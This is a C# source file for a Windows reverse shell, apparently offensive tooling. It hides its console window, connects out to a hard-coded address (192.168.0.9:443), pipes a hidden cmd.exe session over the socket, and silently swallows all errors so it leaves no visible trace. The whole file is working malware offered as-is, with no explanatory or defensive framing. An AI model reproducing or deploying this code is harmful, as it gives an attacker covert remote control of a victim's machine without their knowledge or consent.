namespace RevShell
{
    using System;
    using System.Diagnostics;
    using System.IO;
    using System.Net.Sockets;
    using System.Runtime.InteropServices;
    using System.Text;

    namespace ConnectBack
    {
        public class Program
        {
            [DllImport("kernel32.dll")]
            static extern IntPtr GetConsoleWindow();

            [DllImport("user32.dll")]
            static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

            const int SW_HIDE = 0;
            const int SW_SHOW = 5;

            static StreamWriter streamWriter;

            public static void Main(string[] args)
            {
                var handle = GetConsoleWindow();

                // Hide
                ShowWindow(handle, SW_HIDE);

                try
                {
                    using (TcpClient client = new TcpClient("192.168.0.9", 443))
                    {
                        using (Stream stream = client.GetStream())
                        {
                            using (StreamReader rdr = new StreamReader(stream))
                            {
                                streamWriter = new StreamWriter(stream);

                                StringBuilder strInput = new StringBuilder();

                                Process p = new Process();
                                p.StartInfo.FileName = "cmd.exe";
                                p.StartInfo.CreateNoWindow = true;
                                p.StartInfo.UseShellExecute = false;
                                p.StartInfo.RedirectStandardOutput = true;
                                p.StartInfo.RedirectStandardInput = true;
                                p.StartInfo.RedirectStandardError = true;
                                p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
                                p.Start();
                                p.BeginOutputReadLine();

                                while (true)
                                {
                                    strInput.Append(rdr.ReadLine());
                                    //strInput.Append("\n");
                                    p.StandardInput.WriteLine(strInput);
                                    strInput.Remove(0, strInput.Length);
                                }
                            }
                        }
                    }
                } catch (Exception ex) {
                    // silence is golden
                }
            }

            private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
            {
                StringBuilder strOutput = new StringBuilder();

                if (!String.IsNullOrEmpty(outLine.Data))
                {
                    try {
                        strOutput.Append(outLine.Data);
                        streamWriter.WriteLine(strOutput);
                        streamWriter.Flush();
                    } catch (Exception ex) {
                        // silence is golden
                    }
                }
            }
        }
    }
}
